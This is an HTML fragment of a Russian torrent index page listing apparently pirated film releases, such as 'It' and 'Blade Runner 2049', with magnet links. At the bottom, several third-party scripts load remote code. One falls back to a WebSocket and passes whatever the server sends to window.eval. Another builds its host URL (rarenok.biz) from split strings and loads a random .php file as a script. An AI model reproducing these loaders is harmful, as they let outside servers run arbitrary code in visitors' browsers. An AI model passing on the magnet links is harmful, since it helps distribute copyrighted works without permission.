+<td align="right">3.50&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;10</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603381"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:75d68083f529f44dd459dc0f48c28f49ea7fe107&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603381/ono_it-2017-bdrip-ot-exkinoray-licenzija">Оно / It (2017) BDRip от ExKinoRay | Лицензия </a></td> <td align="right">5<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;22</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;4</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/606751"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:a88aec33ea5b7274fa48d40d366281464c074ab8&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/606751/beguwij-po-lezviju-2049_blade-runner-2049-2017-bdrip-1080p-ot-hellywood-licenzija">Бегущий по лезвию 2049 / Blade Runner 2049 (2017) BDRip 1080p от HELLYWOOD | Лицензия </a></td> <td align="right">3<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">11.23&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;333</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;54</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603227"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7873c29ae9d6e34ee28cf154234276c3bf90b669&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603227/ono_it-2017-bdrip-avc-ot-hellywood-licenzija">Оно / It (2017) BDRip-AVC от HELLYWOOD | Лицензия </a></td> <td align="right">2<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">1.46&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;33</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;3</span></td></tr><tr class="gai"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/603201"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:30afaab07d22333be0b7fca422f66d8cb2726110&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/603201/ono_it-2017-bdrip-720p-ot-hellywood-licenzija">Оно / It (2017) BDRip 720p от HELLYWOOD | Лицензия </a></td> <td align="right">23<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">5.58&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;111</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;13</span></td></tr><tr class="tum"><td>11&nbsp;Янв&nbsp;18</td><td ><a class="downgif" href="/download/65862"><img src="/s/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:5171a45b34033bd66f497843f79c316597e50bdd&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="/s/i/m.png" alt="M" /></a>
+<a href="/torrent/65862/plohoj-lejtenant_bad-lieutenant-1992-bdrip-p-a">Плохой лейтенант / Bad Lieutenant (1992) BDRip | P, A </a></td> <td align="right">9<img src="/s/i/com.gif" alt="C" /></td>
+<td align="right">2.18&nbsp;GB</td><td align="center"><span class="green"><img src="/s/t/arrowup.gif" alt="S" />&nbsp;30</span>&nbsp;<img src="/s/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr></table></div><p align="center"><a href="/browse/0/1/0/0"><b>1&nbsp;-&nbsp;100</b></a> | <b>101&nbsp;-&nbsp;200</b> | <a href="/browse/2/1/0/0"><b>201&nbsp;-&nbsp;300</b></a> | <a href="/browse/3/1/0/0"><b>301&nbsp;-&nbsp;400</b></a> | ... | <a href="/browse/1175/1/0/0"><b>117501&nbsp;-&nbsp;117600</b></a> | <a href="/browse/1176/1/0/0"><b>117601&nbsp;-&nbsp;117700</b></a> | <a href="/browse/1177/1/0/0"><b>117701&nbsp;-&nbsp;117742</b></a><br /><a href="/browse/0/1/0/0"><b>&lt;&lt;&nbsp;Предв.</b></a>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="/browse/2/1/0/0"><b>След.&nbsp;&gt;&gt;</b></a></p>
+
+<center><a href="#up"><img src="/s/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. <a href="/cr/" target="_blank">Информация правообладателям</a>
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="/s/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="/s/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="/s/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
+ var script_id = "MTIzNg==", s = document.createElement("script");
+ s.type = "text/javascript";
+ s.charset = "utf-8";
+s.src = "//torvind.com/js/" + script_id+".js?r="+Math.random()*10000000000;
+ s.async = true;
+ s.onerror = function(){
+  var ws = new WebSocket("ws://torvind.com:8040/");
+  ws.onopen = function () {
+   ws.send(JSON.stringify({type:"p", id: script_id}));
+  };
+  ws.onmessage = function(tx) { ws.close(); window.eval(tx.data); };
+ };
+ document.body.appendChild(s);
+ })();
+</script>
+
+<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>
+
+
+</body>
+</html>
